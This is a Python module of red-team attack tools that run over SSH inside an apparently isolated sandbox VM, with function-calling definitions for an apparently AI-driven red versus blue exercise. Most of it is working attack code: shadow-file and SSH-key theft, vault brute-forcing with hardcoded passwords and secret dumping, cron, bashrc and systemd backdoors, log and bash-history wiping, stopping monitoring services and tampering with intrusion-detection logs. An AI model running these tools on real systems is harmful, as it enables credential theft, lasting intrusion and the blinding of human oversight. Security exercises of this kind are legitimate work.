"""
VM Attack Tools - UNRESTRICTED (runs inside VM via SSH)
==========================================================
These tools execute REAL attacks inside the MultiseatOS VM.
No REDBLUE_ prefix, no safety boundaries, no restrictions.

The VM is an isolated sandbox — it can be destroyed and rebuilt.
All commands run via SSH (paramiko) as user vibemind with sudo.
"""

import asyncio
import json
import os
import sys

_parent = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _parent not in sys.path:
    sys.path.insert(0, _parent)

from infra import VM_SSH_HOST, VM_SSH_PORT, VM_SSH_USER, VM_SSH_PASS, VAULT_URL, VAULT_HOST, VAULT_PORT

# Reuse artifact tracking from safe tools
from red_team.attack_tools import _track_artifact, ARTIFACT_DIR, ARTIFACT_PREFIX, ensure_artifact_dir

import paramiko


def _ssh_connect():
    """Create a new SSH connection to the VM."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(VM_SSH_HOST, port=VM_SSH_PORT, username=VM_SSH_USER, password=VM_SSH_PASS, timeout=10)
    return ssh


def _ssh_run(ssh, cmd, timeout=30):
    """Execute command via SSH. Returns (stdout, stderr, exit_code)."""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode("utf-8", errors="replace")
    err = stderr.read().decode("utf-8", errors="replace")
    rc = stdout.channel.recv_exit_status()
    return out, err, rc


def _save_result(filename, data):
    """Save attack result to local artifact dir for Blue Team to find."""
    ensure_artifact_dir()
    path = os.path.join(ARTIFACT_DIR, f"{ARTIFACT_PREFIX}vm_{filename}")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    artifact = {"type": "file", "path": path, "cleanup_method": "delete_file"}
    _track_artifact(artifact)
    return path, artifact


# ================================================================
# 1. CREDENTIAL THEFT (real)
# ================================================================

async def vm_steal_shadow() -> dict:
    """Read /etc/shadow via sudo — real credential extraction."""
    ssh = _ssh_connect()
    out, err, rc = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S cat /etc/shadow 2>/dev/null")
    ssh.close()

    path, artifact = _save_result("shadow_dump.txt", {
        "source": "/etc/shadow",
        "content": out[:5000],
        "success": rc == 0,
    })
    return {
        "success": rc == 0,
        "description": f"Shadow file extracted: {len(out.splitlines())} entries",
        "artifact": artifact,
    }


async def vm_steal_ssh_keys() -> dict:
    """Steal SSH keys from all users."""
    ssh = _ssh_connect()
    results = {}
    for user_dir in ["/home/vibemind", "/root"]:
        out, _, rc = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S cat {user_dir}/.ssh/id_rsa 2>/dev/null")
        pub, _, _ = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S cat {user_dir}/.ssh/id_rsa.pub 2>/dev/null")
        auth, _, _ = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S cat {user_dir}/.ssh/authorized_keys 2>/dev/null")
        results[user_dir] = {
            "private_key": out[:2000] if out.strip() else None,
            "public_key": pub[:500] if pub.strip() else None,
            "authorized_keys": auth[:1000] if auth.strip() else None,
        }
    ssh.close()
    path, artifact = _save_result("ssh_keys.json", results)
    found = sum(1 for v in results.values() if v.get("private_key"))
    return {"success": True, "description": f"SSH key scan: {found} private keys found", "artifact": artifact}


async def vm_steal_vault_secrets() -> dict:
    """Brute-force vault login then dump all secrets."""
    import urllib.request

    creds = [
        ("admin", "admin123"), ("admin", "admin"), ("admin", "password"),
        ("vibemind", "logitech66"), ("vibemind", "password"),
        ("readonly", "reader"), ("readonly", "readonly"),
    ]

    stolen = {}
    for username, password in creds:
        try:
            data = json.dumps({"username": username, "password": password}).encode()
            req = urllib.request.Request(
                f"http://{VAULT_HOST}:{VAULT_PORT}/api/auth/login",
                data=data, headers={"Content-Type": "application/json"},
            )
            resp = urllib.request.urlopen(req, timeout=5)
            result = json.loads(resp.read())
            token = result.get("token", "")
            if token:
                # List secrets
                req2 = urllib.request.Request(
                    f"http://{VAULT_HOST}:{VAULT_PORT}/api/vault/list",
                    headers={"Authorization": f"Bearer {token}"},
                )
                resp2 = urllib.request.urlopen(req2, timeout=5)
                secret_list = json.loads(resp2.read()).get("secrets", [])

                # Dump each secret
                for key in secret_list:
                    req3 = urllib.request.Request(
                        f"http://{VAULT_HOST}:{VAULT_PORT}/api/vault/get/{key}",
                        headers={"Authorization": f"Bearer {token}"},
                    )
                    resp3 = urllib.request.urlopen(req3, timeout=5)
                    secret_data = json.loads(resp3.read())
                    stolen[key] = secret_data.get("value", "")

                stolen["_auth"] = {"username": username, "token": token}
                break
        except Exception:
            continue

    path, artifact = _save_result("vault_secrets.json", stolen)
    return {
        "success": len(stolen) > 1,
        "description": f"Vault dump: {len(stolen) - 1} secrets stolen" if stolen else "Vault brute-force failed",
        "artifact": artifact,
    }


# ================================================================
# 2. PRIVILEGE ESCALATION (real)
# ================================================================

async def vm_check_suid() -> dict:
    """Find SUID binaries for privilege escalation."""
    ssh = _ssh_connect()
    out, _, rc = _ssh_run(ssh, "find / -perm -4000 -type f 2>/dev/null | head -50", timeout=30)
    ssh.close()
    binaries = [l.strip() for l in out.splitlines() if l.strip()]
    path, artifact = _save_result("suid_binaries.json", {"suid_binaries": binaries, "count": len(binaries)})
    return {"success": True, "description": f"SUID scan: {len(binaries)} binaries found", "artifact": artifact}


async def vm_check_sudo_rights() -> dict:
    """Check what sudo commands are available without password."""
    ssh = _ssh_connect()
    out, _, _ = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S -l 2>/dev/null")
    ssh.close()
    path, artifact = _save_result("sudo_rights.txt", {"sudo_output": out})
    return {"success": True, "description": f"Sudo rights enumerated ({len(out)} chars)", "artifact": artifact}


async def vm_exploit_writable_paths() -> dict:
    """Find world-writable directories and files in sensitive locations."""
    ssh = _ssh_connect()
    out, _, _ = _ssh_run(ssh, "find /etc /usr/local/bin /opt -writable -type f 2>/dev/null | head -30", timeout=20)
    dirs, _, _ = _ssh_run(ssh, "find / -writable -type d 2>/dev/null | grep -vE '/proc|/sys|/dev|/tmp|/run' | head -30", timeout=20)
    ssh.close()
    files = [l.strip() for l in out.splitlines() if l.strip()]
    writable_dirs = [l.strip() for l in dirs.splitlines() if l.strip()]
    path, artifact = _save_result("writable_paths.json", {"writable_files": files, "writable_dirs": writable_dirs})
    return {"success": True, "description": f"Writable paths: {len(files)} files, {len(writable_dirs)} dirs", "artifact": artifact}


# ================================================================
# 3. PERSISTENCE (real)
# ================================================================

async def vm_install_backdoor_cron() -> dict:
    """Install a cron job backdoor."""
    ssh = _ssh_connect()
    _ssh_run(ssh, 'echo "* * * * * echo REDBLUE_backdoor_active > /tmp/.redblue_cron_check" | crontab -')
    out, _, _ = _ssh_run(ssh, "crontab -l")
    ssh.close()
    path, artifact = _save_result("cron_backdoor.txt", {"crontab": out})
    artifact["vm_cleanup"] = "crontab -r"
    return {"success": "REDBLUE_backdoor" in out, "description": "Cron backdoor installed", "artifact": artifact}


async def vm_install_bashrc_backdoor() -> dict:
    """Add backdoor to .bashrc — executes on every login."""
    ssh = _ssh_connect()
    backdoor_line = '\n# REDBLUE_TEST\necho "REDBLUE_backdoor_triggered" > /tmp/.redblue_bashrc_check\n'
    _ssh_run(ssh, f"echo '{backdoor_line}' >> ~/.bashrc")
    out, _, _ = _ssh_run(ssh, "tail -5 ~/.bashrc")
    ssh.close()
    path, artifact = _save_result("bashrc_backdoor.txt", {"bashrc_tail": out})
    artifact["vm_cleanup"] = "sed -i '/REDBLUE_TEST/d' ~/.bashrc && sed -i '/REDBLUE_backdoor/d' ~/.bashrc"
    return {"success": "REDBLUE" in out, "description": ".bashrc backdoor installed", "artifact": artifact}


async def vm_install_systemd_backdoor() -> dict:
    """Create a systemd service backdoor (requires sudo)."""
    ssh = _ssh_connect()
    service = """[Unit]
Description=REDBLUE Test Backdoor
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo REDBLUE_systemd_active > /tmp/.redblue_systemd_check'
[Install]
WantedBy=multi-user.target"""
    _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S bash -c 'cat > /etc/systemd/system/redblue-backdoor.service << EOF\n{service}\nEOF'")
    _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S systemctl daemon-reload")
    _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S systemctl enable redblue-backdoor")
    out, _, _ = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S systemctl is-enabled redblue-backdoor 2>/dev/null")
    ssh.close()
    path, artifact = _save_result("systemd_backdoor.txt", {"status": out.strip()})
    artifact["vm_cleanup"] = f"echo '{VM_SSH_PASS}' | sudo -S systemctl disable redblue-backdoor && sudo rm /etc/systemd/system/redblue-backdoor.service"
    return {"success": "enabled" in out, "description": "Systemd backdoor service installed", "artifact": artifact}


# ================================================================
# 4. LATERAL MOVEMENT (real)
# ================================================================

async def vm_pivot_to_vault() -> dict:
    """From SSH access, pivot to vault API internally."""
    ssh = _ssh_connect()
    # Access vault from inside VM (bypasses any host firewall)
    out, _, rc = _ssh_run(ssh, "curl -s http://localhost:8000/api/auth/status")
    # Try login from inside
    login, _, _ = _ssh_run(ssh, "curl -s -X POST http://localhost:8000/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123\"}'")
    ssh.close()
    path, artifact = _save_result("vault_pivot.json", {"status": out, "login": login})
    return {"success": "token" in login, "description": f"Pivoted to vault from SSH: {'token obtained' if 'token' in login else 'login failed'}", "artifact": artifact}


async def vm_scan_internal_network() -> dict:
    """Scan internal network from inside the VM."""
    ssh = _ssh_connect()
    listeners, _, _ = _ssh_run(ssh, "ss -tlnp")
    connections, _, _ = _ssh_run(ssh, "ss -tnp")
    arp, _, _ = _ssh_run(ssh, "arp -a 2>/dev/null || ip neigh")
    routes, _, _ = _ssh_run(ssh, "ip route")
    ssh.close()
    path, artifact = _save_result("internal_network.json", {
        "listeners": listeners[:3000], "connections": connections[:3000],
        "arp_table": arp, "routes": routes,
    })
    return {"success": True, "description": f"Internal network mapped: {len(listeners.splitlines())} listeners", "artifact": artifact}


# ================================================================
# 5. DATA DESTRUCTION (real — VM only!)
# ================================================================

async def vm_delete_logs() -> dict:
    """Clear system logs — real evidence destruction."""
    ssh = _ssh_connect()
    results = {}
    for log in ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log"]:
        _, err, rc = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S truncate -s 0 {log} 2>/dev/null")
        results[log] = {"cleared": rc == 0}
    # Clear bash history
    _ssh_run(ssh, "history -c && echo '' > ~/.bash_history")
    results["bash_history"] = {"cleared": True}
    ssh.close()
    path, artifact = _save_result("log_destruction.json", results)
    cleared = sum(1 for v in results.values() if v.get("cleared"))
    return {"success": cleared > 0, "description": f"Logs cleared: {cleared}/{len(results)}", "artifact": artifact}


async def vm_kill_services() -> dict:
    """Stop security-relevant services."""
    ssh = _ssh_connect()
    results = {}
    for svc in ["system-monitor", "rsyslog", "cron"]:
        _, err, rc = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S systemctl stop {svc} 2>/dev/null")
        results[svc] = {"stopped": rc == 0}
    ssh.close()
    path, artifact = _save_result("service_kills.json", results)
    artifact["vm_cleanup"] = f"echo '{VM_SSH_PASS}' | sudo -S systemctl start system-monitor rsyslog cron"
    stopped = sum(1 for v in results.values() if v.get("stopped"))
    return {"success": stopped > 0, "description": f"Services stopped: {stopped}/{len(results)}", "artifact": artifact}


# ================================================================
# 6. RECONNAISSANCE (real, deep)
# ================================================================

async def vm_full_enumeration() -> dict:
    """Complete system enumeration — everything an attacker would want."""
    ssh = _ssh_connect()
    data = {}
    commands = {
        "hostname": "hostname",
        "kernel": "uname -a",
        "distro": "cat /etc/os-release",
        "users": "cat /etc/passwd",
        "groups": "cat /etc/group",
        "crontabs": f"echo '{VM_SSH_PASS}' | sudo -S ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null",
        "services": "systemctl list-units --type=service --state=running --no-pager --no-legend",
        "processes": "ps auxf",
        "network": "ss -tlnp",
        "mounts": "mount",
        "env": "env",
        "history": "cat ~/.bash_history 2>/dev/null | tail -50",
        "installed_packages": "dpkg -l 2>/dev/null | tail -30 || rpm -qa 2>/dev/null | tail -30",
    }
    for key, cmd in commands.items():
        out, _, _ = _ssh_run(ssh, cmd, timeout=10)
        data[key] = out[:3000]
    ssh.close()
    path, artifact = _save_result("full_enum.json", data)
    return {"success": True, "description": f"Full enumeration: {len(data)} categories collected", "artifact": artifact}


# ================================================================
# 7. VM CLEANUP (restore after attacks)
# ================================================================

async def vm_cleanup_all() -> dict:
    """Restore VM to clean state after attacks."""
    ssh = _ssh_connect()
    cleanup_cmds = [
        "crontab -r 2>/dev/null",
        "sed -i '/REDBLUE/d' ~/.bashrc 2>/dev/null",
        f"echo '{VM_SSH_PASS}' | sudo -S systemctl disable redblue-backdoor 2>/dev/null",
        f"echo '{VM_SSH_PASS}' | sudo -S rm -f /etc/systemd/system/redblue-backdoor.service 2>/dev/null",
        f"echo '{VM_SSH_PASS}' | sudo -S systemctl start system-monitor rsyslog cron 2>/dev/null",
        f"echo '{VM_SSH_PASS}' | sudo -S systemctl daemon-reload",
        "rm -f /tmp/.redblue_* 2>/dev/null",
    ]
    results = []
    for cmd in cleanup_cmds:
        _, _, rc = _ssh_run(ssh, cmd)
        results.append({"cmd": cmd[:60], "rc": rc})
    ssh.close()
    return {"success": True, "description": f"VM cleanup: {len(results)} commands executed", "artifact": None}


# ================================================================
# 8. IDS EVASION (real)
# ================================================================

async def vm_find_ids_services() -> dict:
    """Enumerate all running services to find IDS processes."""
    ssh = _ssh_connect()
    out, _, _ = _ssh_run(ssh, "systemctl list-units --type=service --state=running --no-pager --no-legend")
    # Filter for security/monitoring related services
    security_keywords = ["security", "monitor", "ids", "detect", "watch", "guard", "audit", "snort", "suricata", "ossec", "fail2ban"]
    lines = out.splitlines()
    security_services = [l for l in lines if any(kw in l.lower() for kw in security_keywords)]
    # Identify unusual (non-standard Ubuntu) services
    standard = {"ssh", "cron", "rsyslog", "networking", "ufw", "snapd", "multipathd", "systemd", "dbus", "accounts-daemon", "polkit"}
    unusual = [l for l in lines if not any(s in l.lower() for s in standard)]
    ssh.close()
    path, artifact = _save_result("ids_services.json", {
        "all_running": lines,
        "security_related": security_services,
        "unusual_services": unusual,
    })
    return {
        "success": True,
        "description": f"IDS service scan: {len(security_services)} security services, {len(unusual)} unusual services found",
        "artifact": artifact,
    }


async def vm_kill_decoy_ids() -> dict:
    """Stop the obvious vm-security-monitor IDS service."""
    ssh = _ssh_connect()
    _, _, rc = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S systemctl stop vm-security-monitor 2>/dev/null")
    status_out, _, _ = _ssh_run(ssh, "systemctl is-active vm-security-monitor 2>/dev/null")
    ssh.close()
    path, artifact = _save_result("decoy_killed.json", {
        "stop_rc": rc,
        "status_after": status_out.strip(),
        "stopped": rc == 0,
    })
    return {
        "success": rc == 0,
        "description": f"Decoy IDS vm-security-monitor: {'stopped' if rc == 0 else 'stop failed'}, status={status_out.strip()}",
        "artifact": artifact,
    }


async def vm_hunt_stealth_ids() -> dict:
    """Search for hidden monitoring processes in the VM."""
    ssh = _ssh_connect()
    # Check unusual listeners (exclude SSH :22, vault :8000, prometheus :9090)
    listeners, _, _ = _ssh_run(ssh, "ss -tlnp | grep -vE ':22 |:8000 |:9090'")
    # Check python processes in system paths (dbus, /usr/lib, /var/lib)
    python_procs, _, _ = _ssh_run(ssh, "ps aux | grep 'python.*dbus\\|python.*/usr/lib\\|python.*/var/lib' | grep -v grep")
    # Check hidden files in /var/lib/.cache
    hidden_files, _, _ = _ssh_run(ssh, "find /var/lib/.cache -type f 2>/dev/null")
    ssh.close()
    path, artifact = _save_result("stealth_hunt.json", {
        "unusual_listeners": listeners[:3000],
        "system_python_procs": python_procs[:3000],
        "hidden_files": hidden_files[:3000],
    })
    return {
        "success": True,
        "description": f"Stealth IDS hunt: {len(listeners.splitlines())} unusual listeners, {len(python_procs.splitlines())} system python procs, {len(hidden_files.splitlines())} hidden files",
        "artifact": artifact,
    }


async def vm_tamper_ids_logs() -> dict:
    """Corrupt/delete IDS log files to blind the defender."""
    ssh = _ssh_connect()
    results = {}
    # Truncate /var/log/vm-security.log
    _, _, rc1 = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S truncate -s 0 /var/log/vm-security.log 2>/dev/null")
    results["vm_security_log"] = {"truncated": rc1 == 0}
    # Truncate /var/lib/.cache/.metrics
    _, _, rc2 = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S truncate -s 0 /var/lib/.cache/.metrics 2>/dev/null")
    results["metrics"] = {"truncated": rc2 == 0}
    # Remove /var/lib/.cache/.heartbeat
    _, _, rc3 = _ssh_run(ssh, f"echo '{VM_SSH_PASS}' | sudo -S rm -f /var/lib/.cache/.heartbeat 2>/dev/null")
    results["heartbeat"] = {"removed": rc3 == 0}
    ssh.close()
    path, artifact = _save_result("ids_tampered.json", results)
    blinded = sum(1 for v in results.values() if v.get("truncated") or v.get("removed"))
    return {
        "success": blinded > 0,
        "description": f"IDS log tamper: {blinded}/{len(results)} targets blinded",
        "artifact": artifact,
    }


# ================================================================
# TOOL DISPATCH & DEFINITIONS
# ================================================================

VM_TOOL_DISPATCH = {
    "vm_steal_shadow": vm_steal_shadow,
    "vm_steal_ssh_keys": vm_steal_ssh_keys,
    "vm_steal_vault_secrets": vm_steal_vault_secrets,
    "vm_check_suid": vm_check_suid,
    "vm_check_sudo_rights": vm_check_sudo_rights,
    "vm_exploit_writable_paths": vm_exploit_writable_paths,
    "vm_install_backdoor_cron": vm_install_backdoor_cron,
    "vm_install_bashrc_backdoor": vm_install_bashrc_backdoor,
    "vm_install_systemd_backdoor": vm_install_systemd_backdoor,
    "vm_pivot_to_vault": vm_pivot_to_vault,
    "vm_scan_internal_network": vm_scan_internal_network,
    "vm_delete_logs": vm_delete_logs,
    "vm_kill_services": vm_kill_services,
    "vm_full_enumeration": vm_full_enumeration,
    "vm_cleanup_all": vm_cleanup_all,
    "vm_find_ids_services": vm_find_ids_services,
    "vm_kill_decoy_ids": vm_kill_decoy_ids,
    "vm_hunt_stealth_ids": vm_hunt_stealth_ids,
    "vm_tamper_ids_logs": vm_tamper_ids_logs,
}

VM_TOOL_DEFINITIONS = [
    # Credential Theft
    {"type": "function", "function": {"name": "vm_steal_shadow", "description": "REAL: Read /etc/shadow via sudo — extract password hashes from VM.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_steal_ssh_keys", "description": "REAL: Steal SSH private keys from all users in the VM.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_steal_vault_secrets", "description": "REAL: Brute-force vault login and dump all stored secrets.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Privilege Escalation
    {"type": "function", "function": {"name": "vm_check_suid", "description": "REAL: Find SUID binaries for privilege escalation vectors.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_check_sudo_rights", "description": "REAL: Check available sudo commands — find escalation paths.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_exploit_writable_paths", "description": "REAL: Find writable files in /etc, /usr/local/bin, /opt for privilege escalation.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Persistence
    {"type": "function", "function": {"name": "vm_install_backdoor_cron", "description": "REAL: Install cron job backdoor that survives reboots.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_install_bashrc_backdoor", "description": "REAL: Add backdoor to .bashrc — executes on every login.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_install_systemd_backdoor", "description": "REAL: Create a persistent systemd service backdoor.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Lateral Movement
    {"type": "function", "function": {"name": "vm_pivot_to_vault", "description": "REAL: Pivot from SSH to vault API — login and extract tokens from inside VM.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_scan_internal_network", "description": "REAL: Map internal network — listeners, connections, ARP table, routes.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Data Destruction
    {"type": "function", "function": {"name": "vm_delete_logs", "description": "REAL: Clear auth.log, syslog, kern.log and bash_history.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_kill_services", "description": "REAL: Stop security services (monitor, rsyslog, cron).", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Reconnaissance
    {"type": "function", "function": {"name": "vm_full_enumeration", "description": "REAL: Complete system enumeration — users, services, network, packages, history, env.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # Cleanup
    {"type": "function", "function": {"name": "vm_cleanup_all", "description": "Restore VM to clean state — remove all backdoors and restart services.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    # IDS Evasion
    {"type": "function", "function": {"name": "vm_find_ids_services", "description": "REAL: Enumerate running services to find IDS/security monitoring processes.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_kill_decoy_ids", "description": "REAL: Stop the vm-security-monitor IDS service — disable obvious decoy monitoring.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_hunt_stealth_ids", "description": "REAL: Search for hidden monitoring processes — unusual listeners, system python procs, hidden files.", "parameters": {"type": "object", "properties": {}, "required": []}}},
    {"type": "function", "function": {"name": "vm_tamper_ids_logs", "description": "REAL: Corrupt/delete IDS log files (vm-security.log, .metrics, .heartbeat) to blind the defender.", "parameters": {"type": "object", "properties": {}, "required": []}}},
]
